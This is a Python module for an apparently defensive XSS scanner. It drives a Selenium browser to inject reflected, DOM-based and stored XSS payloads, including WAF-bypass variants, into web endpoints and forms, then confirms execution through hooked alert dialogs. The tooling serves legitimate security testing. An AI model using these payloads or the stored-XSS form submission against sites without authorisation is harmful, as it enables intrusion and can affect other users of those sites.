"""Selenium-powered XSS detection module.

Unlike the httpx-based scanner that only checks if payloads are reflected in
the raw HTML, this module:
  1. Injects payloads via the browser address bar (GET params) and form fields.
  2. Hooks ``window.alert`` / ``confirm`` / ``prompt`` BEFORE injection so any
     triggered dialog is captured automatically — no false positives.
  3. Detects DOM-based XSS by observing actual JS execution, not just
     source-to-sink pattern matching.
  4. Takes screenshot evidence of every confirmed XSS.
"""

from __future__ import annotations

import os
import time
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    TimeoutException,
    WebDriverException,
    UnexpectedAlertPresentException,
    NoAlertPresentException,
    NoSuchElementException,
    StaleElementReferenceException,
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from scanner.core.browser import create_browser, inject_cookie, take_screenshot
from scanner.utils.logger import get_logger

log = get_logger("xss_selenium")

# ── Payloads ────────────────────────────────────────────────────────
# Payloads designed to trigger the hooked alert/confirm/prompt
PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<img src=x onerror=confirm(1)>',
    '"><img src=x onerror=prompt(1)>',
]

WAF_BYPASS_PAYLOADS = [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src=x onerror="&#x61;lert(1)">',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<svg/onload=alert`1`>',
    '"><svg/onload=confirm`1`>',
]

# JS hook injected into every page BEFORE our payload runs.
# It replaces alert/confirm/prompt so the dialog doesn't block Selenium,
# and records the call for later retrieval.
_HOOK_SCRIPT = """
window.__xss_triggered = [];
window.__orig_alert = window.alert;
window.__orig_confirm = window.confirm;
window.__orig_prompt = window.prompt;
window.alert = function(msg) { window.__xss_triggered.push('alert:' + msg); };
window.confirm = function(msg) { window.__xss_triggered.push('confirm:' + msg); return false; };
window.prompt = function(msg) { window.__xss_triggered.push('prompt:' + msg); return ''; };
"""


def _install_hook_via_cdp(driver: webdriver.Chrome) -> None:
    """Use Chrome DevTools Protocol to inject the alert hook BEFORE any
    page JavaScript runs.  This ensures that even inline <script>alert()</script>
    payloads are captured rather than spawning a native dialog."""
    try:
        driver.execute_cdp_cmd(
            "Page.addScriptToEvaluateOnNewDocument",
            {"source": _HOOK_SCRIPT},
        )
    except Exception:
        # Fallback: older Selenium/Chrome without CDP support
        pass


def _check_triggered(driver: webdriver.Chrome) -> list[str]:
    """Return list of triggered alert/confirm/prompt messages."""
    # First dismiss any native alert that slipped through
    try:
        alert = driver.switch_to.alert
        text = alert.text
        alert.accept()
        return [f"native_alert:{text}"]
    except NoAlertPresentException:
        pass

    try:
        triggered = driver.execute_script("return window.__xss_triggered || [];")
        return triggered if isinstance(triggered, list) else []
    except (WebDriverException, UnexpectedAlertPresentException):
        # If script fails because an alert is present, that IS a trigger
        try:
            alert = driver.switch_to.alert
            text = alert.text
            alert.accept()
            return [f"native_alert:{text}"]
        except NoAlertPresentException:
            return []


def _inject_hook(driver: webdriver.Chrome) -> None:
    """Inject the alert/confirm/prompt hook into the current page."""
    try:
        driver.execute_script(_HOOK_SCRIPT)
    except (WebDriverException, UnexpectedAlertPresentException):
        # Dismiss any stuck alert, then retry
        try:
            driver.switch_to.alert.accept()
        except NoAlertPresentException:
            pass
        try:
            driver.execute_script(_HOOK_SCRIPT)
        except WebDriverException:
            pass


def _inject_param_url(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


# ── Core test functions ─────────────────────────────────────────────

def _test_reflected_selenium(
    driver: webdriver.Chrome,
    url: str,
    param: str,
    use_waf_bypass: bool = False,
    evidence_dir: str | None = None,
) -> dict[str, Any] | None:
    """Inject payloads into a GET parameter and check if alert fires."""
    payloads = WAF_BYPASS_PAYLOADS if use_waf_bypass else PAYLOADS
    for payload in payloads:
        target = _inject_param_url(url, param, payload)
        try:
            driver.get(target)
            # The CDP hook (installed once) intercepts alert/confirm/prompt
            # before any JS executes, so we just need a moment for event
            # handlers (onerror, onload, etc.) to fire.
            time.sleep(0.3)
            triggered = _check_triggered(driver)
            if triggered:
                log.info("[XSS] Reflected CONFIRMED on %s param=%s", url, param)
                screenshot = None
                if evidence_dir:
                    screenshot = take_screenshot(
                        driver, f"xss_reflected_{urlparse(url).path}_{param}", evidence_dir
                    )
                return {
                    "xss_type": "Reflected",
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"Browser triggered: {triggered}",
                    "url": url,
                    "screenshot": screenshot,
                    "confirmed_in_browser": True,
                }
            # Fallback: check if payload is reflected unescaped in the DOM
            # (may still be exploitable even if alert didn't fire due to CSP)
            if payload in driver.page_source:
                log.info("[XSS] Reflected (payload in DOM) on %s param=%s", url, param)
                screenshot = None
                if evidence_dir:
                    screenshot = take_screenshot(
                        driver, f"xss_reflected_{urlparse(url).path}_{param}", evidence_dir
                    )
                return {
                    "xss_type": "Reflected",
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"Payload reflected unescaped in rendered DOM",
                    "url": url,
                    "screenshot": screenshot,
                    "confirmed_in_browser": True,
                }
        except (TimeoutException, WebDriverException):
            continue
    return None


def _test_stored_selenium(
    driver: webdriver.Chrome,
    form: dict[str, Any],
    retrieve_url: str,
    evidence_dir: str | None = None,
) -> dict[str, Any] | None:
    """Submit XSS via a form, then reload the page to check persistence."""
    canary = "SELENIUM_XSS_CANARY_7b2e"
    payload = f'<script>alert("{canary}")</script>'

    target_param = None
    for inp in form["inputs"]:
        if inp["type"] in ("text", "textarea", "search", "hidden", "") and inp["name"]:
            target_param = inp["name"]
            break
    if not target_param:
        return None

    try:
        driver.get(form["action"])

        # Fill in the form fields
        for inp in form["inputs"]:
            name = inp["name"]
            if not name:
                continue
            try:
                el = driver.find_element(By.CSS_SELECTOR, f'[name="{name}"]')
                el.clear()
                if name == target_param:
                    el.send_keys(payload)
                elif inp["value"]:
                    el.send_keys(inp["value"])
                else:
                    el.send_keys("test")
            except (NoSuchElementException, StaleElementReferenceException):
                continue

        # Submit the form
        try:
            submit = driver.find_element(By.CSS_SELECTOR, 'input[type="submit"], button[type="submit"], button:not([type])')
            submit.click()
        except NoSuchElementException:
            driver.find_element(By.TAG_NAME, "form").submit()

        time.sleep(0.5)

        # Navigate to the retrieval page
        driver.get(retrieve_url)
        time.sleep(0.3)

        triggered = _check_triggered(driver)
        if triggered and any(canary in str(t) for t in triggered):
            log.info("[XSS] Stored CONFIRMED via form %s param=%s", form["action"], target_param)
            screenshot = None
            if evidence_dir:
                screenshot = take_screenshot(
                    driver, f"xss_stored_{target_param}", evidence_dir
                )
            return {
                "xss_type": "Stored",
                "parameter": target_param,
                "payload": payload,
                "evidence": f"Browser triggered on reload: {triggered}",
                "url": form["action"],
                "screenshot": screenshot,
                "confirmed_in_browser": True,
            }
    except (TimeoutException, WebDriverException) as exc:
        log.debug("Stored XSS test failed for %s: %s", form["action"], exc)
    return None


def _test_dom_based_selenium(
    driver: webdriver.Chrome,
    url: str,
    evidence_dir: str | None = None,
) -> list[dict[str, Any]]:
    """Test for DOM-based XSS by injecting payloads into the URL fragment/hash."""
    findings: list[dict[str, Any]] = []
    hash_payloads = [
        '#<script>alert("DOM")</script>',
        '#"><img src=x onerror=alert(1)>',
    ]
    for hash_payload in hash_payloads:
        target = url.split("#")[0] + hash_payload
        try:
            driver.get(target)
            time.sleep(0.3)
            triggered = _check_triggered(driver)
            if triggered:
                log.info("[XSS] DOM-based CONFIRMED on %s", url)
                screenshot = None
                if evidence_dir:
                    screenshot = take_screenshot(
                        driver, f"xss_dom_{urlparse(url).path}", evidence_dir
                    )
                findings.append({
                    "xss_type": "DOM-based",
                    "parameter": "URL fragment/hash",
                    "payload": hash_payload,
                    "evidence": f"Browser triggered: {triggered}",
                    "url": url,
                    "screenshot": screenshot,
                    "confirmed_in_browser": True,
                })
                break  # one confirmation is enough
        except (TimeoutException, WebDriverException):
            continue
    return findings


# ── Public API ──────────────────────────────────────────────────────

def test_xss_selenium(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    waf_detected: bool = False,
    cookie: str | None = None,
    headless: bool = True,
    quick: bool = False,
    evidence_dir: str | None = None,
) -> list[dict[str, Any]]:
    """Run XSS tests using a real browser.

    Returns a list of confirmed finding dicts with optional screenshot paths.
    """
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()  # (path, param) dedup

    if evidence_dir:
        os.makedirs(evidence_dir, exist_ok=True)

    with create_browser(headless=headless) as driver:
        # Install CDP hook so alert/confirm/prompt are intercepted on every page
        _install_hook_via_cdp(driver)

        # Inject session cookie if provided
        if cookie and endpoints:
            inject_cookie(driver, endpoints[0], cookie)

        # Cap endpoints to avoid extremely long browser scans
        max_endpoints = 20 if quick else 30
        capped_endpoints = endpoints[:max_endpoints]

        # ── Reflected XSS on GET params ─────────────────────
        for url in capped_endpoints:
            params = parse_qs(urlparse(url).query)
            path = urlparse(url).path
            for param in params:
                sig = (path, param)
                if sig in seen:
                    continue
                result = _test_reflected_selenium(
                    driver, url, param,
                    use_waf_bypass=waf_detected,
                    evidence_dir=evidence_dir,
                )
                if result:
                    findings.append(_to_finding(result))
                    seen.add(sig)

        # ── DOM-based XSS ───────────────────────────────────────
        visited: set[str] = set()
        dom_limit = 10 if quick else 15
        dom_tested = 0
        for url in capped_endpoints:
            if dom_tested >= dom_limit:
                break
            base = urlparse(url)._replace(query="", fragment="").geturl()
            if base in visited:
                continue
            visited.add(base)
            dom_tested += 1
            for dom_finding in _test_dom_based_selenium(driver, url, evidence_dir=evidence_dir):
                findings.append(_to_finding(dom_finding))

        # ── Stored XSS via forms ────────────────────────────────
        stored_limit = 10 if quick else 12
        for form in forms[:stored_limit]:
            if form["method"] != "POST":
                continue
            result = _test_stored_selenium(
                driver, form, form["action"], evidence_dir=evidence_dir
            )
            if result:
                findings.append(_to_finding(result))

    log.info("Selenium XSS scan complete — %d confirmed findings", len(findings))
    return findings


def _to_finding(raw: dict[str, Any]) -> dict[str, Any]:
    xss_type = raw["xss_type"]
    if xss_type == "Stored":
        severity, score, vector = "High", 6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    elif xss_type == "DOM-based":
        severity, score, vector = "Medium", 6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    else:
        severity, score, vector = "Medium", 6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"

    finding: dict[str, Any] = {
        "title": f"{xss_type} XSS on {urlparse(raw['url']).path} (Browser-confirmed)",
        "severity": severity,
        "cvss_score": score,
        "cvss_vector": vector,
        "affected_url": raw["url"],
        "parameter": raw["parameter"],
        "payload": raw["payload"],
        "evidence": raw["evidence"][:500],
        "confirmed_in_browser": raw.get("confirmed_in_browser", False),
        "remediation": "Encode all user-supplied output contextually (HTML, JS, URL). "
                       "Implement a strict Content-Security-Policy header.",
        "owasp_category": "A05:2025 - Injection",
    }
    if raw.get("screenshot"):
        finding["screenshot"] = raw["screenshot"]
    return finding
